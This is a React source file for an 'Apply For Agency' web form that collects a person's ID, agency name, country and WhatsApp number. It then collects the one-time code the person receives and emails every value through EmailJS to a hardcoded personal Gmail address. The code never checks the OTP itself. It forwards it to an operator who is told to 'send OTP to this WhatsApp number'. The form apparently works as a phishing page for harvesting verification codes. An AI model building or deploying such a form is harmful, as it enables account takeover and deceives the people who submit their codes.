"use client"

import { useState } from "react"
import emailjs from '@emailjs/browser'

const COUNTRIES_WITH_CODES = [
  { name: "Afghanistan", code: "+93" },
  { name: "Albania", code: "+355" },
  { name: "Algeria", code: "+213" },
  { name: "Andorra", code: "+376" },
  { name: "Angola", code: "+244" },
  { name: "Argentina", code: "+54" },
  { name: "Armenia", code: "+374" },
  { name: "Australia", code: "+61" },
  { name: "Austria", code: "+43" },
  { name: "Azerbaijan", code: "+994" },
  { name: "Bahamas", code: "+1242" },
  { name: "Bahrain", code: "+973" },
  { name: "Bangladesh", code: "+880" },
  { name: "Barbados", code: "+1246" },
  { name: "Belarus", code: "+375" },
  { name: "Belgium", code: "+32" },
  { name: "Belize", code: "+501" },
  { name: "Benin", code: "+229" },
  { name: "Bhutan", code: "+975" },
  { name: "Bolivia", code: "+591" },
  { name: "Bosnia and Herzegovina", code: "+387" },
  { name: "Botswana", code: "+267" },
  { name: "Brazil", code: "+55" },
  { name: "Brunei", code: "+673" },
  { name: "Bulgaria", code: "+359" },
  { name: "Burkina Faso", code: "+226" },
  { name: "Burundi", code: "+257" },
  { name: "Cambodia", code: "+855" },
  { name: "Cameroon", code: "+237" },
  { name: "Canada", code: "+1" },
  { name: "Cape Verde", code: "+238" },
  { name: "Central African Republic", code: "+236" },
  { name: "Chad", code: "+235" },
  { name: "Chile", code: "+56" },
  { name: "China", code: "+86" },
  { name: "Colombia", code: "+57" },
  { name: "Comoros", code: "+269" },
  { name: "Congo", code: "+242" },
  { name: "Costa Rica", code: "+506" },
  { name: "Croatia", code: "+385" },
  { name: "Cuba", code: "+53" },
  { name: "Cyprus", code: "+357" },
  { name: "Czech Republic", code: "+420" },
  { name: "Denmark", code: "+45" },
  { name: "Djibouti", code: "+253" },
  { name: "Dominica", code: "+1767" },
  { name: "Dominican Republic", code: "+1809" },
  { name: "Ecuador", code: "+593" },
  { name: "Egypt", code: "+20" },
  { name: "El Salvador", code: "+503" },
  { name: "Equatorial Guinea", code: "+240" },
  { name: "Eritrea", code: "+291" },
  { name: "Estonia", code: "+372" },
  { name: "Ethiopia", code: "+251" },
  { name: "Fiji", code: "+679" },
  { name: "Finland", code: "+358" },
  { name: "France", code: "+33" },
  { name: "Gabon", code: "+241" },
  { name: "Gambia", code: "+220" },
  { name: "Georgia", code: "+995" },
  { name: "Germany", code: "+49" },
  { name: "Ghana", code: "+233" },
  { name: "Greece", code: "+30" },
  { name: "Grenada", code: "+1473" },
  { name: "Guatemala", code: "+502" },
  { name: "Guinea", code: "+224" },
  { name: "Guinea-Bissau", code: "+245" },
  { name: "Guyana", code: "+592" },
  { name: "Haiti", code: "+509" },
  { name: "Honduras", code: "+504" },
  { name: "Hungary", code: "+36" },
  { name: "Iceland", code: "+354" },
  { name: "India", code: "+91" },
  { name: "Indonesia", code: "+62" },
  { name: "Iran", code: "+98" },
  { name: "Iraq", code: "+964" },
  { name: "Ireland", code: "+353" },
  { name: "Israel", code: "+972" },
  { name: "Italy", code: "+39" },
  { name: "Jamaica", code: "+1876" },
  { name: "Japan", code: "+81" },
  { name: "Jordan", code: "+962" },
  { name: "Kazakhstan", code: "+7" },
  { name: "Kenya", code: "+254" },
  { name: "Kiribati", code: "+686" },
  { name: "Kosovo", code: "+383" },
  { name: "Kuwait", code: "+965" },
  { name: "Kyrgyzstan", code: "+996" },
  { name: "Laos", code: "+856" },
  { name: "Latvia", code: "+371" },
  { name: "Lebanon", code: "+961" },
  { name: "Lesotho", code: "+266" },
  { name: "Liberia", code: "+231" },
  { name: "Libya", code: "+218" },
  { name: "Liechtenstein", code: "+423" },
  { name: "Lithuania", code: "+370" },
  { name: "Luxembourg", code: "+352" },
  { name: "Madagascar", code: "+261" },
  { name: "Malawi", code: "+265" },
  { name: "Malaysia", code: "+60" },
  { name: "Maldives", code: "+960" },
  { name: "Mali", code: "+223" },
  { name: "Malta", code: "+356" },
  { name: "Marshall Islands", code: "+692" },
  { name: "Mauritania", code: "+222" },
  { name: "Mauritius", code: "+230" },
  { name: "Mexico", code: "+52" },
  { name: "Micronesia", code: "+691" },
  { name: "Moldova", code: "+373" },
  { name: "Monaco", code: "+377" },
  { name: "Mongolia", code: "+976" },
  { name: "Montenegro", code: "+382" },
  { name: "Morocco", code: "+212" },
  { name: "Mozambique", code: "+258" },
  { name: "Myanmar", code: "+95" },
  { name: "Namibia", code: "+264" },
  { name: "Nauru", code: "+674" },
  { name: "Nepal", code: "+977" },
  { name: "Netherlands", code: "+31" },
  { name: "New Zealand", code: "+64" },
  { name: "Nicaragua", code: "+505" },
  { name: "Niger", code: "+227" },
  { name: "Nigeria", code: "+234" },
  { name: "North Korea", code: "+850" },
  { name: "North Macedonia", code: "+389" },
  { name: "Norway", code: "+47" },
  { name: "Oman", code: "+968" },
  { name: "Pakistan", code: "+92" },
  { name: "Palau", code: "+680" },
  { name: "Palestine", code: "+970" },
  { name: "Panama", code: "+507" },
  { name: "Papua New Guinea", code: "+675" },
  { name: "Paraguay", code: "+595" },
  { name: "Peru", code: "+51" },
  { name: "Philippines", code: "+63" },
  { name: "Poland", code: "+48" },
  { name: "Portugal", code: "+351" },
  { name: "Qatar", code: "+974" },
  { name: "Romania", code: "+40" },
  { name: "Russia", code: "+7" },
  { name: "Rwanda", code: "+250" },
  { name: "Saint Kitts and Nevis", code: "+1869" },
  { name: "Saint Lucia", code: "+1758" },
  { name: "Saint Vincent and the Grenadines", code: "+1784" },
  { name: "Samoa", code: "+685" },
  { name: "San Marino", code: "+378" },
  { name: "Sao Tome and Principe", code: "+239" },
  { name: "Saudi Arabia", code: "+966" },
  { name: "Senegal", code: "+221" },
  { name: "Serbia", code: "+381" },
  { name: "Seychelles", code: "+248" },
  { name: "Sierra Leone", code: "+232" },
  { name: "Singapore", code: "+65" },
  { name: "Slovakia", code: "+421" },
  { name: "Slovenia", code: "+386" },
  { name: "Solomon Islands", code: "+677" },
  { name: "Somalia", code: "+252" },
  { name: "South Africa", code: "+27" },
  { name: "South Korea", code: "+82" },
  { name: "South Sudan", code: "+211" },
  { name: "Spain", code: "+34" },
  { name: "Sri Lanka", code: "+94" },
  { name: "Sudan", code: "+249" },
  { name: "Suriname", code: "+597" },
  { name: "Sweden", code: "+46" },
  { name: "Switzerland", code: "+41" },
  { name: "Syria", code: "+963" },
  { name: "Taiwan", code: "+886" },
  { name: "Tajikistan", code: "+992" },
  { name: "Tanzania", code: "+255" },
  { name: "Thailand", code: "+66" },
  { name: "Timor-Leste", code: "+670" },
  { name: "Togo", code: "+228" },
  { name: "Tonga", code: "+676" },
  { name: "Trinidad and Tobago", code: "+1868" },
  { name: "Tunisia", code: "+216" },
  { name: "Turkey", code: "+90" },
  { name: "Turkmenistan", code: "+993" },
  { name: "Tuvalu", code: "+688" },
  { name: "Uganda", code: "+256" },
  { name: "Ukraine", code: "+380" },
  { name: "United Arab Emirates", code: "+971" },
  { name: "United Kingdom", code: "+44" },
  { name: "United States", code: "+1" },
  { name: "Uruguay", code: "+598" },
  { name: "Uzbekistan", code: "+998" },
  { name: "Vanuatu", code: "+678" },
  { name: "Vatican City", code: "+39" },
  { name: "Venezuela", code: "+58" },
  { name: "Vietnam", code: "+84" },
  { name: "Yemen", code: "+967" },
  { name: "Zambia", code: "+260" },
  { name: "Zimbabwe", code: "+263" },
]

export default function AgencyForm() {
  const [formData, setFormData] = useState({
    id: "",
    agencyName: "",
    mobileNumber: "",
    countryCode: "",
    country: "",
    otp: "",
  })
  const [otpSent, setOtpSent] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")
  const [success, setSuccess] = useState("")
  const [isSubmitted, setIsSubmitted] = useState(false)

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }))
  }

  const handleCountryChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    const selectedCountry = COUNTRIES_WITH_CODES.find(c => c.name === e.target.value)
    setFormData((prev) => ({
      ...prev,
      country: e.target.value,
      countryCode: selectedCountry?.code || "",
    }))
  }

  const handleGetOTP = () => {
    if (!formData.mobileNumber.trim() || !formData.agencyName.trim()) {
      setError("Please enter both agency name and mobile number")
      return
    }
    setIsLoading(true)
    setError("")
    setSuccess("")
    
    // EmailJS configuration using environment variables
    const serviceId = process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID as string;
    const templateId = process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID as string;
    const publicKey = process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY as string;
    
    // Get full phone number with country code
    const fullPhoneNumber = `${formData.countryCode}${formData.mobileNumber}`;
    
    // Prepare the email template parameters
    const templateParams = {
      email: 'serlywang21@gmail.com',
      id: formData.id,
      agencyName: formData.agencyName,
      country: formData.country,
      mobileNumber: fullPhoneNumber,
      message: `New Agency Application:\n\nID: ${formData.id}\nAgency Name: ${formData.agencyName}\nCountry: ${formData.country}\nPhone Number: ${fullPhoneNumber}\n\nPlease send OTP to this WhatsApp number.`
    };
    
    // Send the email
    emailjs.send(serviceId, templateId, templateParams, publicKey)
      .then(() => {
        setOtpSent(true)
        setSuccess("Request sent! Check your WhatsApp for the OTP.")
      })
      .catch(() => {
        setError("Failed to send request. Please try again.")
      })
      .finally(() => {
        setIsLoading(false)
      })
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    
    // Check if all required fields are filled
    if (!formData.id || !formData.agencyName || !formData.mobileNumber || !formData.country || !formData.otp) {
      setError("Please fill in all required fields.")
      return
    }
    
    // Send OTP verification email
    const serviceId = process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID as string;
    const templateId = process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID as string;
    const publicKey = process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY as string;
    
    const fullPhoneNumber = `${formData.countryCode}${formData.mobileNumber}`;
    
    const templateParams = {
      email: 'serlywang21@gmail.com',
      id: formData.id,
      agencyName: formData.agencyName,
      country: formData.country,
      mobileNumber: fullPhoneNumber,
      otp: formData.otp,
      message: `OTP Verification for Agency Application:\n\nID: ${formData.id}\nAgency Name: ${formData.agencyName}\nCountry: ${formData.country}\nPhone Number: ${fullPhoneNumber}\nOTP Entered: ${formData.otp}\n\nPlease verify this OTP matches what you sent.`
    };
    
    // Send verification email
    emailjs.send(serviceId, templateId, templateParams, publicKey)
      .then(() => {
        setError("")
        setSuccess("")
        setIsSubmitted(true)
      })
      .catch(() => {
        setError("Failed to submit application. Please try again.")
      })
  }

  // Show success page after submission
  if (isSubmitted) {
    return (
      <div className="w-full max-w-md bg-white rounded-2xl shadow-lg p-8 text-center">
        <div className="mb-6">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <span className="text-3xl">✅</span>
          </div>
          <h1 className="text-2xl font-bold text-green-600 mb-2">Thank You!</h1>
          <p className="text-gray-600 text-sm leading-relaxed">
            Your agency application has been submitted successfully. 
            Your agency account is being created and we will get back to you when it is successfully set up.
          </p>
        </div>
        
        <div className="bg-gray-50 rounded-lg p-4 mb-6">
          <h3 className="font-semibold text-gray-700 mb-2">Application Details:</h3>
          <div className="text-sm text-gray-600 space-y-1">
            <p><strong>ID:</strong> {formData.id}</p>
            <p><strong>Agency Name:</strong> {formData.agencyName}</p>
            <p><strong>Mobile:</strong> {formData.mobileNumber}</p>
            <p><strong>Country:</strong> {formData.country}</p>
          </div>
        </div>
        
        <button
          onClick={() => window.location.reload()}
          className="px-6 py-2 bg-green-500 text-white rounded-lg hover:bg-green-600 transition"
        >
          Submit Another Application
        </button>
      </div>
    )
  }

  return (
    <div className="w-full max-w-sm bg-white rounded-2xl shadow-lg p-8">
      <div className="text-center mb-4">
        <h1 className="text-xl font-bold text-green-500">Apply For Agency</h1>
      </div>

      {/* Illustration Section */}
      <div className="mb-8 flex justify-center">
        <img
          src="/business-agency-illustration-with-people-and-docum.jpg"
          alt="Agency illustration"
          className="w-full h-auto rounded-lg"
        />
      </div>

      {/* Header Section */}
      <div className="text-center mb-8">
        <p className="text-sm text-gray-600">Describe your agent information</p>
      </div>

      {/* Form Section */}
      <form onSubmit={handleSubmit} className="space-y-5">
        {/* ID Field */}
        <div>
          <label className="block text-sm font-medium text-gray-600 mb-2">ID</label>
          <div className="relative">
            <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">🆔</span>
            <input
              type="text"
              name="id"
              value={formData.id}
              onChange={handleInputChange}
              placeholder="Enter your id"
              className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent transition"
            />
          </div>
        </div>
        {/* Agency Name Field */}
        <div>
          <label className="block text-sm font-medium text-gray-600 mb-2">Agency Name</label>
          <div className="relative">
            <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">🏢</span>
            <input
              type="text"
              name="agencyName"
              value={formData.agencyName}
              onChange={handleInputChange}
              placeholder="Enter agency name"
              className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent transition"
            />
          </div>
        </div>

        {/* Mobile Number Field with OTP Button */}
        <div>
          <label className="block text-sm font-medium text-gray-600 mb-2">Mobile Number</label>
          <div className="flex gap-2">
            <div className="relative flex-1">
              <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 text-sm">
                {formData.countryCode || "📱"}
              </span>
              <input
                type="tel"
                name="mobileNumber"
                value={formData.mobileNumber}
                onChange={handleInputChange}
                placeholder="Enter mobile number"
                className={`w-full ${formData.countryCode ? 'pl-16' : 'pl-10'} pr-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent transition`}
              />
            </div>
            <button
              type="button"
              onClick={handleGetOTP}
              disabled={isLoading}
              className={`px-4 py-3 bg-green-500 text-white font-semibold rounded-lg transition ${
                isLoading ? "opacity-70 cursor-not-allowed" : "hover:bg-green-600"
              }`}
            >
              {isLoading ? "Sending..." : "Get OTP"}
            </button>
          </div>
        </div>

        {/* Country Dropdown */}
        <div>
          <div className="flex items-center mb-2">
            <label className="block text-sm font-medium text-gray-600">Country</label>
            <span className="text-xs text-red-500 ml-2 whitespace-nowrap">* Not to be alter once set</span>
          </div>
          <div className="relative flex items-center gap-2">
            <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">🌍</span>
            <select
              name="country"
              value={formData.country}
              onChange={handleCountryChange}
              className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent transition appearance-none bg-white"
            >
              <option value="" disabled>Select your country</option>
              {COUNTRIES_WITH_CODES.map((country) => (
                <option key={country.name} value={country.name}>
                  {country.name}
                </option>
              ))}
            </select>
            <span className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">▼</span>
          </div>
        </div>

        {/* Error message */}
        {error && <p className="text-sm text-red-500">{error}</p>}
        
        {/* Success message */}
        {success && <p className="text-sm text-green-500">{success}</p>}

        {/* OTP Input Field (shown only after OTP is sent) */}
        {otpSent && (
          <div>
            <label className="block text-sm font-medium text-gray-600 mb-2">OTP Verification</label>
            <div className="relative">
              <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">🔒</span>
              <input
                type="text"
                name="otp"
                value={formData.otp}
                onChange={handleInputChange}
                placeholder="Enter OTP code"
                className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent transition"
              />
            </div>
          </div>
        )}

        {/* Submit Button */}
        <button
          type="submit"
          className="w-full py-3 bg-green-500 text-white font-semibold rounded-lg hover:bg-green-600 transition"
        >
          Submit Application
        </button>
      </form>
    </div>
  );
}
